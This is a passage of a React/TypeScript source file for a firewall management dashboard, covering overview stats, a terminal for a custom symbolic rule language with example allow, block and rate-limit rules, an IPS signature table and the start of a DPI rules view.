// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
// GhostOS™ Firewall — ProxhqVPN Next-Generation Firewall System
import { useState, useRef, useEffect, useCallback } from "react";
import {
  Shield, Terminal, AlertTriangle, Globe2, Rss, Layers, Link2,
  Ban, BarChart3, Download, Trash2, RefreshCw, Zap, Eye,
  Play, Plus, Search, Copy, Check, FlaskConical, ChevronDown, ChevronRight,
  Tag, Clock, ArrowLeftRight, Gauge, Network, ScanLine, Fingerprint,
  Server, BellOff, FileJson, Filter,
} from "lucide-react";
import {
  useListGhostOsRules, useCreateGhostOsRule, useDeleteGhostOsRule, useUpdateGhostOsRule,
  useTranscribeToSymscript, useParseGhostOsRule,
  useListIpsSignatures, useToggleIpsSignature, useBulkToggleIpsCategory, useDeleteIpsSignature,
  useListDpiRules, useCreateDpiRule, useDeleteDpiRule, useUpdateDpiRule, useTestDpiPattern,
  useListGeoBlocks, useAddGeoBlock, useRemoveGeoBlock, useUpdateGeoBlock,
  useListThreatFeeds, useSyncThreatFeed, useUpdateThreatFeed,
  useListFirewallZones, useCreateFirewallZone, useDeleteFirewallZone, useUpdateFirewallZone,
  useListFqdnRules, useCreateFqdnRule, useDeleteFqdnRule, useUpdateFqdnRule,
  useGetFirewallAnalytics, useListThreatProfiles, useApplyThreatProfile,
  useCheckRuleConflicts,
  useGetFirewallStatus, useToggleFirewall,
  useListFirewallRules, useCreateFirewallRule, useDeleteFirewallRule, useUpdateFirewallRule,
  useListBlockedIps, useBlockIp, useUnblockIp, useGenerateIptablesRules,
} from "@workspace/api-client-react";

const TAB_ICONS: Record<string, React.ReactNode> = {
  overview: <Shield size={13} />, ghostos: <Terminal size={13} />, ips: <AlertTriangle size={13} />,
  dpi: <Eye size={13} />, threat: <Globe2 size={13} />, zones: <Layers size={13} />,
  rules: <Link2 size={13} />, blacklist: <Ban size={13} />, analytics: <BarChart3 size={13} />, export: <Download size={13} />,
  analyzer: <FlaskConical size={13} />,
  // New gap-filling features (pfSense / OPNsense / IPFire / Snort / Suricata)
  aliases:     <Tag size={13} />,
  schedules:   <Clock size={13} />,
  nat:         <ArrowLeftRight size={13} />,
  qos:         <Gauge size={13} />,
  wan:         <Network size={13} />,
  stateTable:  <Rss size={13} />,
  portscans:   <ScanLine size={13} />,
  tls:         <Fingerprint size={13} />,
  dnsMonitor:  <Server size={13} />,
  suppressions:<BellOff size={13} />,
  eveExport:   <FileJson size={13} />,
  proxy:       <Filter size={13} />,
};
const TABS = [
  { id:"overview", label:"Overview" }, { id:"ghostos", label:"GhostOS™" }, { id:"ips", label:"IPS Engine" },
  { id:"dpi", label:"DPI Engine" }, { id:"threat", label:"Threat Intel" }, { id:"zones", label:"Zones" },
  { id:"rules", label:"Rules" }, { id:"blacklist", label:"Blacklist" }, { id:"analytics", label:"Analytics" }, { id:"export", label:"Export" },
  { id:"analyzer", label:"Payload Analyzer" },
  // ── Gap features ──────────────────────────────────────────────────────────
  { id:"aliases",     label:"Aliases" },
  { id:"schedules",   label:"Schedules" },
  { id:"nat",         label:"NAT/Forward" },
  { id:"qos",         label:"QoS/Shaping" },
  { id:"wan",         label:"WAN Groups" },
  { id:"stateTable",  label:"State Table" },
  { id:"portscans",   label:"Portscan Det." },
  { id:"tls",         label:"JA3/TLS Intel" },
  { id:"dnsMonitor",  label:"DNS Monitor" },
  { id:"suppressions",label:"Suppressions" },
  { id:"eveExport",   label:"EVE Export" },
  { id:"proxy",       label:"Web Proxy" },
];
const SEV_COLOR: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#aaccff", info:"#888" };
const TRUST_COLOR: Record<string,string> = { trusted:"#00ff88", untrusted:"#ff4444", dmz:"#ff9900", management:"#4488ff" };

function Bdg({ label, color, sm }: { label: string; color?: string; sm?: boolean }) {
  const c = color ?? "#00ff88";
  return <span style={{ background: c+"22", color: c, border:`1px solid ${c}44`, borderRadius:4, padding: sm?"1px 6px":"2px 8px", fontSize: sm?10:11, fontFamily:"monospace", fontWeight:700, letterSpacing:1, textTransform:"uppercase" }}>{label}</span>;
}
function CopyBtn({ text }: { text: string }) {
  const [ok, setOk] = useState(false);
  return <button onClick={() => { navigator.clipboard.writeText(text); setOk(true); setTimeout(()=>setOk(false),1500); }} style={{ background:"none", border:"none", cursor:"pointer", color: ok?"#00ff88":"#555", padding:0, marginLeft:4 }}>{ok?<Check size={11}/>:<Copy size={11}/>}</button>;
}

// ── Overview ─────────────────────────────────────────────────────────────
function OverviewTab() {
  const { data: st } = useGetFirewallStatus();
  const { data: an } = useGetFirewallAnalytics();
  const tog = useToggleFirewall();
  const tl = an?.threatLevel ?? "safe";
  const tlC = tl==="critical"?"#ff2244":tl==="high"?"#ff6600":tl==="medium"?"#ffaa00":tl==="low"?"#aaccff":"#00ff88";
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:16 }}>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:20, gridColumn:"1/-1" }}>
        <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:16 }}>
          <div style={{ display:"flex", alignItems:"center", gap:10 }}>
            <Shield size={18} color="#00ff88" />
            <span style={{ fontFamily:"monospace", fontWeight:800, fontSize:14 }}>GhostOS™ Firewall — ProxhqVPN NGFW</span>
            <Bdg label={st?.mode?.toUpperCase()??"STEALTH"} color="#00ff88" sm />
            <Bdg label={st?.enabled?"ARMED":"OFFLINE"} color={st?.enabled?"#00ff88":"#ff4444"} sm />
          </div>
          <button onClick={()=>tog.mutate({data:{ enabled:!st?.enabled }})} style={{ background: st?.enabled?"#ff444422":"#00ff8822", border:`1px solid ${st?.enabled?"#ff444444":"#00ff8844"}`, color: st?.enabled?"#ff4444":"#00ff88", borderRadius:6, padding:"6px 14px", cursor:"pointer", fontFamily:"monospace", fontSize:12 }}>
            {st?.enabled?"Disarm Firewall":"Arm Firewall"}
          </button>
        </div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(6,1fr)", gap:10 }}>
          {[{l:"Rules",v:st?.totalRules??0,c:"#00ff88"},{l:"Blocked IPs",v:st?.blockedIps??0,c:"#ff4444"},{l:"IPS Sigs",v:st?.ipsSignatures??0,c:"#ff9900"},{l:"GhostOS Rules",v:st?.ghostOsRules??0,c:"#cc44ff"},{l:"Pkts Blocked",v:st?.packetsBlocked??0,c:"#ff6600"},{l:"Pkts Allowed",v:st?.packetsAllowed??0,c:"#44aaff"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"12px 6px" }}>
              <div style={{ fontSize:22, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v.toLocaleString()}</div>
              <div style={{ fontSize:10, color:"#555", marginTop:2 }}>{s.l}</div>
            </div>
          ))}
        </div>
      </div>
      <div style={{ background:"#0a0a0a", border:`1px solid ${tlC}44`, borderRadius:8, padding:20 }}>
        <div style={{ fontSize:11, color:"#555", marginBottom:8, textTransform:"uppercase", letterSpacing:1 }}>Threat Level</div>
        <div style={{ fontSize:40, fontWeight:900, color:tlC, fontFamily:"monospace", letterSpacing:4, textTransform:"uppercase" }}>{tl}</div>
        <div style={{ fontSize:11, color:"#444", marginTop:8 }}>{an?.totalBlocked24h??0} blocked · {an?.totalIpsHits24h??0} IPS hits</div>
      </div>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:20 }}>
        <div style={{ fontSize:11, color:"#555", marginBottom:12, textTransform:"uppercase", letterSpacing:1 }}>Recent Blocks</div>
        {(an?.recentBlocks??[]).length===0?<div style={{color:"#00ff88",fontFamily:"monospace",fontSize:12}}>✓ No recent blocks</div>:(an?.recentBlocks??[]).slice(0,5).map((b:{ip?:string;reason?:string},i:number)=>(
          <div key={i} style={{ display:"flex", justifyContent:"space-between", fontSize:12, marginBottom:6 }}>
            <span style={{ fontFamily:"monospace", color:"#ff4444" }}>{b.ip}</span>
            <span style={{ color:"#444", fontSize:11 }}>{(b.reason??"").substring(0,28)}</span>
          </div>
        ))}
      </div>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:20, gridColumn:"1/-1" }}>
        <div style={{ fontSize:11, color:"#555", marginBottom:12, textTransform:"uppercase", letterSpacing:1 }}>IPS Engine — Category Status</div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:10 }}>
          {(an?.ipsCategoryBreakdown??[]).map((cat:{category?:string;enabled?:number;total?:number;hits?:number})=>(
            <div key={cat.category} style={{ background:"#111", borderRadius:6, padding:"10px 14px", display:"flex", justifyContent:"space-between", alignItems:"center" }}>
              <div>
                <div style={{ fontSize:11, fontFamily:"monospace", color:"#bbb", textTransform:"uppercase" }}>{cat.category}</div>
                <div style={{ fontSize:10, color:"#444" }}>{cat.enabled}/{cat.total} enabled</div>
              </div>
              <div style={{ fontSize:18, fontWeight:700, color:(cat.hits??0)>0?"#ff6600":"#2a2a2a", fontFamily:"monospace" }}>{cat.hits}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ── GhostOS™ Terminal ─────────────────────────────────────────────────────
function GhostOsTab() {
  const [input, setInput] = useState("");
  const [hist, setHist] = useState<Array<{type:"i"|"o"|"e"|"s";text:string}>>([
    {type:"o",text:"GhostOS™ ProxhqVPN Firewall OS v1.0 — © 2026 Alpha Unlimited Technologies LLC"},
    {type:"o",text:"SymScript™ Language Engine loaded. 47 IPS signatures active."},
    {type:"o",text:"Type 'help' for command reference. All commands are proprietary — unknown to attack tools."},
    {type:"o",text:""},
  ]);
  const [cmdHist, setCmdHist] = useState<string[]>([]);
  const [histIdx, setHistIdx] = useState(-1);
  const [trInput, setTrInput] = useState("");
  const [trResult, setTrResult] = useState<{symscript?:string;explanation?:string;confidence?:number;compiledIptables?:string}|null>(null);
  const [newRule, setNewRule] = useState("");
  const termRef = useRef<HTMLDivElement>(null);
  const { data: rules, refetch } = useListGhostOsRules();
  const create = useCreateGhostOsRule();
  const del = useDeleteGhostOsRule();
  const upd = useUpdateGhostOsRule();
  const transcribe = useTranscribeToSymscript();
  const parse = useParseGhostOsRule();

  useEffect(()=>{ if(termRef.current) termRef.current.scrollTop=termRef.current.scrollHeight; },[hist]);
  const add = (type:"i"|"o"|"e"|"s", text:string) => setHist(h=>[...h,{type,text}]);

  const run = async (cmd:string) => {
    const c = cmd.trim(); if(!c) return;
    setCmdHist(h=>[c,...h.slice(0,49)]); setHistIdx(-1);
    add("i",`ghost@proxhqos:~$ ${c}`);
    if(c==="help"){
      add("o","═══ SymScript™ Commands ═══");
      add("o","  list              — list all active GhostOS™ rules");
      add("o","  add <rule>        — add a new SymScript™ rule");
      add("o","  del <id>          — delete rule by ID");
      add("o","  enable/disable <id> — toggle rule");
      add("o","  parse <rule>      — parse and explain a SymScript™ expression");
      add("o","  spec              — show SymScript™ language specification");
      add("o","  clear             — clear terminal");
      add("o","");
      add("o","═══ SymScript™ Verb Reference ═══");
      add("o","  ⊕ PERMIT   ⊘ DROP   ⊗ REJECT   ⊛ RATE-LIMIT   ⊜ INSPECT   ⊝ LOG+ALLOW   ⊞ LOG+BLOCK");
      add("o","");
      add("o","═══ Protocol Tokens ═══");
      add("o","  ΩT=TCP  ΩU=UDP  ΩI=ICMP  Ω6T=TCPv6  Ω*=ANY");
      add("o","");
      add("o","═══ Direction Operators ═══");
      add("o","  ← INBOUND   → OUTBOUND   ↔ BIDIRECTIONAL");
      add("o","");
      add("o","═══ Example SymScript™ Rules ═══");
      add("o","  ⊕ 51820::ΩU ← @ANY ≫1        # Allow WireGuard inbound, priority 1");
      add("o","  ⊕ 443::ΩT ← @ANY ≫5           # Allow HTTPS inbound");
      add("o","  ⊘ @GEO:KP ↔ @ANY ≫80          # Block North Korea (all traffic)");
      add("o","  ⊛ 22::ΩT ← @ANY ⚡5/min ≫50   # Rate-limit SSH brute force");
      add("o","  ⊞ ← @ANY ≫98                   # Log + block all unmatched inbound");
      add("o","  ⊥ ← ⊘                           # Default deny all inbound");
    } else if(c==="list"){
      const r=rules?.rules??[]; if(!r.length){add("o","No rules configured.");return;}
      add("o"," ID  ON   RULE");
      r.forEach(rule=>add("o",` ${String(rule.id).padStart(2)}  ${rule.enabled?"✓":"✗"}   ${rule.symbolicRule}  ${rule.description?`# ${rule.description}`:""}`));
    } else if(c.startsWith("add ")){
      const sym=c.slice(4).trim();
      try { await create.mutateAsync({data:{symbolicRule:sym}}); await refetch(); add("s",`✓ Rule added: ${sym}`); }
      catch(e:unknown){add("e",`✗ ${e instanceof Error?e.message:"Failed to add rule"}`);}
    } else if(c.startsWith("del ")){
      try { await del.mutateAsync({id:parseInt(c.slice(4))}); await refetch(); add("s","✓ Rule deleted"); }
      catch{add("e","✗ Failed");}
    } else if(c.startsWith("enable ")){
      try { await upd.mutateAsync({id:parseInt(c.slice(7)),data:{enabled:true}}); await refetch(); add("s","✓ Enabled"); }
      catch{add("e","✗ Failed");}
    } else if(c.startsWith("disable ")){
      try { await upd.mutateAsync({id:parseInt(c.slice(8)),data:{enabled:false}}); await refetch(); add("s","✓ Disabled"); }
      catch{add("e","✗ Failed");}
    } else if(c.startsWith("parse ")){
      try {
        const r=await parse.mutateAsync({data:{rule:c.slice(6).trim()}});
        if(r.valid){
          add("s","✓ Valid SymScript™");
          const p=r.parsed as Record<string,unknown>;
          add("o",`  Verb:      ${p?.verbLabel}`);
          add("o",`  Protocol:  ${p?.protocolLabel}${p?.port?":"+p.port:""}`);
          add("o",`  Direction: ${p?.dirLabel}`);
          add("o",`  Source:    ${p?.source??'@ANY'}`);
          add("o",`  iptables:  ${r.compiledIptables}`);
        } else add("e",`✗ ${r.error}`);
      } catch{add("e","✗ Parse failed");}
    } else if(c==="spec"){
      add("o","SymScript™ v1.0 — GhostOS™ ProxhqOS Firewall Language");
      add("o","Verbs:     ⊕ ⊘ ⊗ ⊛ ⊜ ⊝ ⊞");
      add("o","Protocols: ΩT(TCP) ΩU(UDP) ΩI(ICMP) Ω6T(TCPv6) Ω6U(UDPv6) Ω*(ANY)");
      add("o","Direction: ←(in) →(out) ↔(both)");
      add("o","Sources:   @IP @CIDR @GEO:XX @ANY");
      add("o","Zones:     ⟦I⟧(inner) ⟦O⟧(outer) ⟦D⟧(dmz) ⟦M⟧(mgmt) ⟦WG⟧ ⟦TOR⟧");
      add("o","Priority:  ≫N  (lower = higher priority)");
      add("o","Rate Limit: ⚡N/s  ⚡N/min  ⚡N/hr");
      add("o","Default:   ⊥ ← ⊘  (fallthrough deny inbound)");
    } else if(c==="clear"){
      setHist([{type:"o",text:"GhostOS™ terminal cleared."}]);
    } else {
      add("e",`✗ Unknown command: '${c}'. Type 'help'.`);
    }
    setInput("");
  };

  const handleTranscribe = async () => {
    if(!trInput.trim()) return;
    try { const r=await transcribe.mutateAsync({data:{input:trInput,format:"english"}}); setTrResult(r); }
    catch{}
  };
  const applyTranscribed = async () => {
    if(!trResult?.symscript) return;
    try { await create.mutateAsync({data:{symbolicRule:trResult.symscript,description:`Transcribed: ${trInput}`}}); await refetch(); add("s",`✓ Applied: ${trResult.symscript}`); setTrResult(null); setTrInput(""); }
    catch{}
  };

  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 295px", gap:16, height:680 }}>
      <div style={{ display:"flex", flexDirection:"column", gap:0 }}>
        {/* Terminal chrome */}
        <div style={{ background:"#0d0d0d", border:"1px solid #1a1a1a", borderBottom:"none", borderRadius:"8px 8px 0 0", padding:"8px 14px", display:"flex", alignItems:"center", gap:8 }}>
          {["#ff4444","#ffaa00","#00ff88"].map(c=><div key={c} style={{width:9,height:9,borderRadius:"50%",background:c}}/>)}
          <span style={{ color:"#444", fontSize:11, fontFamily:"monospace", marginLeft:8 }}>GhostOS™ SymScript™ Terminal — PROXHQOS/1.0</span>
        </div>
        <div ref={termRef} style={{ flex:1, background:"#060606", border:"1px solid #1a1a1a", overflow:"auto", padding:14, fontFamily:"monospace", fontSize:12, lineHeight:1.65, minHeight:260 }}>
          {hist.map((l,i)=>(
            <div key={i} style={{ color: l.type==="i"?"#44aaff":l.type==="e"?"#ff4444":l.type==="s"?"#00ff88":"#666", whiteSpace:"pre-wrap" }}>{l.text}</div>
          ))}
        </div>
        <div style={{ background:"#0d0d0d", border:"1px solid #1a1a1a", borderTop:"1px solid #222", borderRadius:"0 0 8px 8px", padding:"8px 14px", display:"flex", alignItems:"center", gap:8 }}>
          <span style={{ color:"#00ff88", fontFamily:"monospace", fontSize:12, whiteSpace:"nowrap" }}>ghost@proxhqos:~$</span>
          <input style={{ flex:1, background:"transparent", border:"none", outline:"none", color:"#44aaff", fontFamily:"monospace", fontSize:12 }} value={input} onChange={e=>setInput(e.target.value)}
            onKeyDown={e=>{ if(e.key==="Enter") run(input); else if(e.key==="ArrowUp"){const n=Math.min(histIdx+1,cmdHist.length-1);setHistIdx(n);setInput(cmdHist[n]??"");} else if(e.key==="ArrowDown"){const n=Math.max(histIdx-1,-1);setHistIdx(n);setInput(n===-1?"":cmdHist[n]??"");} }}
            placeholder="Enter SymScript™ command or type 'help'..." autoFocus />
          <button onClick={()=>run(input)} style={{ background:"#00ff8811", border:"1px solid #00ff8833", color:"#00ff88", borderRadius:4, padding:"3px 10px", cursor:"pointer" }}><Play size={10}/></button>
        </div>
        {/* Transcriber */}
        <div style={{ marginTop:12, background:"#0a0a0a", border:"1px solid #cc44ff44", borderRadius:8, padding:14 }}>
          <div style={{ fontSize:11, color:"#cc44ff", fontFamily:"monospace", fontWeight:700, marginBottom:10, display:"flex", alignItems:"center", gap:6 }}>
            <Zap size={11}/> SYMSCRIPT™ TRANSCRIBER — Plain English / iptables → SymScript™
          </div>
          <div style={{ display:"flex", gap:8, marginBottom:8 }}>
            <input value={trInput} onChange={e=>setTrInput(e.target.value)} onKeyDown={e=>e.key==="Enter"&&handleTranscribe()} placeholder='"allow TCP port 443 inbound" or paste iptables rule...' style={{ flex:1, background:"#111", border:"1px solid #333", borderRadius:6, padding:"7px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none" }}/>
            <button onClick={handleTranscribe} disabled={transcribe.isPending} style={{ background:"#cc44ff22", border:"1px solid #cc44ff44", color:"#cc44ff", borderRadius:6, padding:"7px 14px", cursor:"pointer", fontFamily:"monospace", fontSize:11 }}>
              {transcribe.isPending?"...":"Transcribe →"}
            </button>
          </div>
          {trResult&&(
            <div style={{ background:"#0d0d0d", borderRadius:6, padding:12, display:"flex", flexDirection:"column", gap:8 }}>
              <div style={{ display:"flex", alignItems:"center", gap:8 }}>
                <span style={{ fontSize:10, color:"#555" }}>SymScript™:</span>
                <span style={{ fontFamily:"monospace", fontSize:14, color:"#00ff88", fontWeight:700 }}>{trResult.symscript}</span>
                <CopyBtn text={trResult.symscript??""} />
                <span style={{ marginLeft:"auto", fontSize:10, color:"#444" }}>Confidence: {trResult.confidence}%</span>
              </div>
              <div style={{ fontSize:11, color:"#555" }}>{trResult.explanation}</div>
              {trResult.compiledIptables&&(
                <div style={{ fontFamily:"monospace", fontSize:10, color:"#44aaff", background:"#111", borderRadius:4, padding:6 }}>
                  {trResult.compiledIptables} <CopyBtn text={trResult.compiledIptables}/>
                </div>
              )}
              <div style={{ display:"flex", gap:8 }}>
                <button onClick={applyTranscribed} style={{ background:"#00ff8822", border:"1px solid #00ff8844", color:"#00ff88", borderRadius:6, padding:"5px 12px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>✓ Apply to GhostOS™</button>
                <button onClick={()=>{setNewRule(trResult.symscript??"");}} style={{ background:"#44aaff22", border:"1px solid #44aaff44", color:"#44aaff", borderRadius:6, padding:"5px 12px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>Edit in terminal</button>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Right panel */}
      <div style={{ display:"flex", flexDirection:"column", gap:12, overflow:"hidden" }}>
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:12, flex:1, overflow:"auto" }}>
          <div style={{ fontSize:10, color:"#444", textTransform:"uppercase", letterSpacing:1, marginBottom:8 }}>Active Rules ({rules?.total??0})</div>
          <div style={{ display:"flex", gap:6, marginBottom:8 }}>
            <input value={newRule} onChange={e=>setNewRule(e.target.value)} onKeyDown={e=>e.key==="Enter"&&run(`add ${newRule}`)} placeholder="⊕ 443::ΩT ← @ANY ≫5" style={{ flex:1, background:"#111", border:"1px solid #333", borderRadius:4, padding:"5px 8px", color:"#00ff88", fontFamily:"monospace", fontSize:10, outline:"none" }}/>
            <button onClick={()=>run(`add ${newRule}`)} style={{ background:"#00ff8811", border:"1px solid #00ff8833", color:"#00ff88", borderRadius:4, padding:"0 8px", cursor:"pointer" }}><Plus size={11}/></button>
          </div>
          {(rules?.rules??[]).map(rule=>(
            <div key={rule.id} style={{ background:"#111", borderRadius:6, padding:"8px 10px", marginBottom:6, borderLeft:`3px solid ${rule.enabled?"#00ff88":"#222"}` }}>
              <div style={{ fontFamily:"monospace", fontSize:11, color:rule.enabled?"#00ff88":"#444", wordBreak:"break-all" }}>{rule.symbolicRule}</div>
              {rule.description&&<div style={{ fontSize:10, color:"#333", marginTop:2 }}>{rule.description}</div>}
              <div style={{ display:"flex", gap:4, marginTop:6 }}>
                <button onClick={()=>upd.mutate({id:rule.id,data:{enabled:!rule.enabled}},{onSuccess:()=>refetch()})} style={{ background:"none", border:"1px solid #333", borderRadius:3, padding:"2px 6px", cursor:"pointer", color:rule.enabled?"#00ff88":"#444", fontSize:9, fontFamily:"monospace" }}>{rule.enabled?"ON":"OFF"}</button>
                <button onClick={()=>del.mutate({id:rule.id},{onSuccess:()=>refetch()})} style={{ background:"none", border:"1px solid #ff444433", borderRadius:3, padding:"2px 5px", cursor:"pointer", color:"#ff4444" }}><Trash2 size={8}/></button>
                <CopyBtn text={rule.symbolicRule}/>
              </div>
            </div>
          ))}
        </div>
        {/* Symbol quick-ref */}
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:12 }}>
          <div style={{ fontSize:10, color:"#333", textTransform:"uppercase", marginBottom:8 }}>SymScript™ Quick Reference</div>
          {[["⊕","PERMIT","#00ff88"],["⊘","DROP","#ff4444"],["⊗","REJECT","#ff6600"],["⊛","RATE-LIMIT","#ffaa00"],["⊜","INSPECT","#44aaff"],["⊝","LOG+ALLOW","#888"],["⊞","LOG+BLOCK","#cc44ff"]].map(([sym,lbl,c])=>(
            <div key={sym} style={{ display:"flex", alignItems:"center", gap:8, marginBottom:3 }}>
              <span style={{ fontSize:13, color:c, width:18 }}>{sym}</span>
              <span style={{ fontSize:10, color:"#444", fontFamily:"monospace" }}>{lbl}</span>
            </div>
          ))}
          <div style={{ borderTop:"1px solid #1a1a1a", marginTop:8, paddingTop:8, display:"flex", flexWrap:"wrap", gap:4 }}>
            {["ΩT","ΩU","ΩI","Ω*","←","→","↔","@ANY","@GEO:XX","≫N","⚡N/min"].map(tok=>(
              <button key={tok} onClick={()=>setNewRule(r=>r+tok)} style={{ background:"#111", border:"1px solid #222", borderRadius:3, padding:"2px 6px", cursor:"pointer", color:"#666", fontFamily:"monospace", fontSize:10 }}>{tok}</button>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// ── IPS Engine ────────────────────────────────────────────────────────────
function IpsTab() {
  const { data, refetch } = useListIpsSignatures();
  const tog = useToggleIpsSignature();
  const del = useDeleteIpsSignature();
  const bulk = useBulkToggleIpsCategory();
  const [search, setSearch] = useState("");
  const [selCat, setSelCat] = useState("all");
  const sigs = data?.signatures??[];
  const cats = Object.keys(data?.categoryCounts??{});
  const filtered = sigs.filter(s=>(selCat==="all"||s.category===selCat)&&(!search||s.name.toLowerCase().includes(search.toLowerCase())||s.sid.toLowerCase().includes(search.toLowerCase())));
  return (
    <div style={{ display:"flex", flexDirection:"column", gap:12 }}>
      <div style={{ display:"flex", alignItems:"center", gap:10, flexWrap:"wrap" }}>
        <div style={{ fontSize:13, fontWeight:700, color:"#ff9900" }}>IPS Engine — {data?.enabledCount??0}/{data?.total??0} Signatures Active</div>
        <div style={{ position:"relative", flex:1, minWidth:200 }}>
          <Search size={11} style={{ position:"absolute", left:9, top:"50%", transform:"translateY(-50%)", color:"#444" }}/>
          <input value={search} onChange={e=>setSearch(e.target.value)} placeholder="Search signatures, SIDs, CVEs..." style={{ width:"100%", paddingLeft:28, background:"#111", border:"1px solid #333", borderRadius:6, padding:"7px 10px 7px 26px", color:"#ccc", fontSize:12, outline:"none", boxSizing:"border-box" }}/>
        </div>
        <button onClick={()=>bulk.mutate({data:{category:selCat==="all"?"web-attacks":selCat,enabled:true}},{onSuccess:()=>refetch()})} style={{ background:"#00ff8811", border:"1px solid #00ff8833", color:"#00ff88", borderRadius:6, padding:"7px 12px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>Enable All</button>
        <button onClick={()=>bulk.mutate({data:{category:selCat==="all"?"web-attacks":selCat,enabled:false}},{onSuccess:()=>refetch()})} style={{ background:"#ff444411", border:"1px solid #ff444433", color:"#ff4444", borderRadius:6, padding:"7px 12px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>Disable All</button>
      </div>
      <div style={{ display:"flex", gap:6, flexWrap:"wrap" }}>
        {["all",...cats].map(cat=>(
          <button key={cat} onClick={()=>setSelCat(cat)} style={{ background:selCat===cat?"#ff990022":"#111", border:`1px solid ${selCat===cat?"#ff9900":"#333"}`, color:selCat===cat?"#ff9900":"#555", borderRadius:6, padding:"5px 11px", cursor:"pointer", fontSize:10, fontFamily:"monospace", textTransform:"uppercase" }}>
            {cat==="all"?`All (${sigs.length})`:`${cat} (${(data?.categoryCounts as Record<string,{total:number}>)?.[cat]?.total??0})`}
          </button>
        ))}
      </div>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, overflow:"auto", maxHeight:460 }}>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:12 }}>
          <thead><tr style={{ borderBottom:"1px solid #1a1a1a" }}>{["SID","Signature Name","Category","Severity","CVE","Action","Status",""].map(h=><th key={h} style={{ padding:"9px 12px", textAlign:"left", color:"#444", fontSize:10, textTransform:"uppercase", letterSpacing:1 }}>{h}</th>)}</tr></thead>
          <tbody>
            {filtered.map(sig=>(
              <tr key={sig.id} style={{ borderBottom:"1px solid #0d0d0d", opacity:sig.enabled?1:0.45 }}>
                <td style={{ padding:"7px 12px", fontFamily:"monospace", color:"#444", fontSize:10 }}>{sig.sid}</td>
                <td style={{ padding:"7px 12px", color:"#bbb", maxWidth:240 }}>
                  <div>{sig.name}</div>
                  {sig.description&&<div style={{ fontSize:10, color:"#333", marginTop:1 }}>{sig.description}</div>}
                </td>
                <td style={{ padding:"7px 12px" }}><Bdg label={sig.category} color="#ff9900" sm/></td>
                <td style={{ padding:"7px 12px" }}><Bdg label={sig.severity} color={SEV_COLOR[sig.severity]??"#888"} sm/></td>
                <td style={{ padding:"7px 12px", fontFamily:"monospace", fontSize:10, color:"#444" }}>{sig.cveId ?? "—"}</td>
                <td style={{ padding:"7px 12px" }}><Bdg label={sig.action} color={sig.action==="drop"?"#ff4444":"#ffaa00"} sm/></td>
                <td style={{ padding:"7px 12px" }}>
                  <button onClick={()=>tog.mutate({id:sig.id,data:{enabled:!sig.enabled}},{onSuccess:()=>refetch()})} style={{ background:sig.enabled?"#00ff8822":"#22222222", border:`1px solid ${sig.enabled?"#00ff8844":"#333"}`, color:sig.enabled?"#00ff88":"#444", borderRadius:4, padding:"3px 10px", cursor:"pointer", fontSize:10, fontFamily:"monospace" }}>{sig.enabled?"ON":"OFF"}</button>
                </td>
                <td style={{ padding:"7px 12px" }}>
                  <button onClick={()=>del.mutate({id:sig.id},{onSuccess:()=>refetch()})} style={{ background:"none", border:"1px solid #ff444433", borderRadius:3, padding:"2px 5px", cursor:"pointer", color:"#ff4444" }}><Trash2 size={8}/></button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}

// ── DPI Engine ────────────────────────────────────────────────────────────
function DpiTab() {
  const { data, refetch } = useListDpiRules();
  const create = useCreateDpiRule();
  const del = useDeleteDpiRule();
  const upd = useUpdateDpiRule();
  const testPat = useTestDpiPattern();
  const [form, setForm] = useState({ name:"", pattern:"", patternType:"url", action:"block", description:"" });
  const [testInput, setTestInput] = useState("");
  const [testResult, setTestResult] = useState<{matched?:boolean}|null>(null);
  return (
    <div style={{ display:"flex", gap:16 }}>
      <div style={{ flex:1, display:"flex", flexDirection:"column", gap:12 }}>
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, overflow:"auto", maxHeight:360 }}>
          <div style={{ padding:"10px 14px", borderBottom:"1px solid #1a1a1a", fontSize:11, color:"#44aaff", fontWeight:700 }}>DPI Rules — {data?.enabledCount}/{data?.total} Active</div>
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
            <thead><tr style={{ borderBottom:"1px solid #111" }}>{["Name","Pattern","Type","Action","Hits",""].map(h=><th key={h} style={{ padding:"8px 12px", textAlign:"left", color:"#444", fontSize:10, textTransform:"uppercase" }}>{h}</th>)}</tr></thead>
            <tbody>{(data?.rules??[]).map(r=>(
              <tr key={r.id} style={{ borderBottom:"1px solid #0d0d0d", opacity:r.enabled?1:0.4 }}>
                <td style={{ padding:"7px 12px", color:"#bbb" }}>{r.name}</td>
                <td style={{ padding:"7px 12px", fontFamily:"monospace", fontSize:10, color:"#666", maxWidth:180, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{r.pattern}</td>
                <td style={{ padding:"7px 12px" }}><Bdg label={r.patternType} color="#44aaff" sm/></td>
